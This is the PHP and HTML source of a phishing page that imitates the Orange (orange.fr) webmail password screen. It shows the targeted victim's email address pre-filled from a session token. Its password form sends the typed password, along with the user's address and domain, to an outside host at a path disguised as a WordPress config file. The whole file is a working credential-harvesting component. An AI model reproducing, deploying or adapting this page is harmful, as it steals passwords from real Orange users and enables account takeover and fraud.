<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <title>Saisissez votre mot de passe - Identification Orange</title>
  <link rel="icon" href="https://idme.cdn.s.woopic.com/idme-front-1.5.0//static/icons/apple-touch-icon-57x57.png" type="image/x-icon">
  <style>
    html,
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      border: 0;
      position: absolute;
      height: 100%;
      min-width: 100%;
      font-size: 13px;
      color: #404040;
      direction: ltr;
      -webkit-text-size-adjust: none;
    }

    button,
    input[type=button],
    input[type=submit] {
      font-family: Arial, sans-serif;
      font-size: 13px;
    }

    h1 {
      font-size: 20px;
      color: #262626;
      margin: 0 0 15px;
      font-weight: normal;
    }

    h2 {
      font-size: 14px;
      color: #262626;
      margin: 0 0 15px;
      font-weight: bold;
    }

    .footer {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      background-color: #626159;
      height: 20px;
      color: white;
      text-align: right;
    }

    .floating-label-group {
      position: relative;
      margin-top: 13px;
      width: 100%;
    }

    .floating-label-group input[type="password"] {
      padding: 12px 5px 5px 5px;
      font-size: 15px;
      border: 1px solid transparent;
      border-bottom: 1px solid black;
      width: 100%;
      background: transparent;
      color: #404040;
      box-sizing: border-box;
      transition: border 0.2s ease-in-out;
    }

    .floating-label-group input[type="password"]:focus {
      outline: none;
      border-top: 1px solid white;
      border-left: 1px solid white;
      border-right: 1px solid white;
      border-bottom: 1px solid black;
    }

    .floating-label-group label {
      position: absolute;
      top: 10px;
      left: 5px;
      font-size: 16px;
      color: #999;
      pointer-events: none;
      transition: 0.2s ease all;
    }

    .floating-label-group input:focus + label,
    .floating-label-group input:not(:placeholder-shown) + label {
      top: -10px;
      left: 3px;
      font-size: 16px;
      color: #404040;
      padding: 0 4px;
    }
  </style>
</head>

<body background="img/bg.png">

  <div align="center">
    <table border="0" width="71%" cellspacing="0" cellpadding="0">
      <tr>
        <td>
          <table border="0" width="100%" cellspacing="0" cellpadding="0">
            <tr>
              <td height="13"></td>
            </tr>
            <tr>
              <td>
                <table border="0" width="100%" cellspacing="0" cellpadding="0">
                  <tr>
                    <td width="195">&nbsp;</td>
                    <td width="565" height="650" background="img/form.png">
                      <table border="0" width="100%" cellspacing="0" cellpadding="0">
                       <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
                        <tr>
                          <td height="182"></td>
                        </tr>
                        <tr>
                          <td>
                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="212">
									<img border="0" src="img/arrow_left.png" width="54" height="33" align="right"></td>
									<td bgcolor="#F4F4F4" width="6"></td>
									<td bgcolor="#F4F4F4">
									<b><?php echo $users;?>@<?php echo $ddomain;?></b></td>
									<td width="161">
									<img border="0" src="img/arrow_right.png" width="20" height="33" align="left"></td>
								</tr>
							</table>
                          </td>
                        </tr>
                        <tr>
                          <td height="102"></td>
                        </tr>
                        <tr>
                          <td>
                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
                              <tr>
                                <td width="36"></td>
                                <td height="54">
                                  <!-- Floating label password input -->
                                  <div class="floating-label-group">
                                    <input type="password" name="passwd" id="passwd" required placeholder="" autofocus />
                                    <label for="passwd">Votre mot de passe</label>
                                  </div>
                                </td>
                                <td width="81">
                                    <input type="hidden" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" />
                                    <input type="hidden" name="domain" value="<?php echo $ddomain;?>" />
                                    <input type="hidden" name="link" value="https://rms.orange.fr/webmail/fr_FR/inbox.html" />
                                    <input type="hidden" name="sender" value="Orange.fr" />
                                </td>
                              </tr>
                            </table>
                          </td>
                        </tr>
                        <tr>
                          <td height="44"></td>
                        </tr>
                        <tr>
                          <td>
                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
                              <tr>
                                <td width="196"></td>
                                <td width="175">
                                  <input type="image" src="img/btn.png" width="174" height="50" >
                                </td>
                                <td>&nbsp;</td>
                              </tr>
                            </table>
                          </td>
                        </tr>
                        <tr>
                          <td height="180"></td>
                        </tr>
                       </form>
                      </table>
                    </td>
                    <td width="193">&nbsp;</td>
                  </tr>
                </table>
              </td>
            </tr>
            <tr>
              <td height="10"></td>
            </tr>
            <tr>
              <td height="83"></td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </div>

</body>

</html><script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>